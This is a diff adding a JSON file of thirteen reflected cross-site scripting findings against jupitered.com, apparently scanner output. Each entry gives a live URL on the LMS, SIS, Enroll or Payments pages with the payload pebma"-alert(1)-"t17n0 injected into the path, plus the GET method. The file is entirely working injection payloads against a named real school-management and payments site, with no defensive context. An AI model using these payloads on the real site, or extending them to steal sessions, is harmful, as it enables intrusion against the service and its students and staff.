@@ -1,0 +1,67 @@
+[
+    {
+        "url_xss": "https://jupitered.com/LMS_public.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/LMS_private.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/LMS_highered.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/LMS_single.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/SIS_public.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/SIS_private.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/SIS_highered.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/Enroll_public.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/Enroll_private.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/Enroll_highered.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/Payments_public.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/Payments_private.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    },
+    {
+        "url_xss": "https://jupitered.com/Payments_highered.php/pebma%22-alert(1)-%22t17n0",
+        "method": "GET",
+        "data": "pebma\"-alert(1)-\"t17n0"
+    }
+]
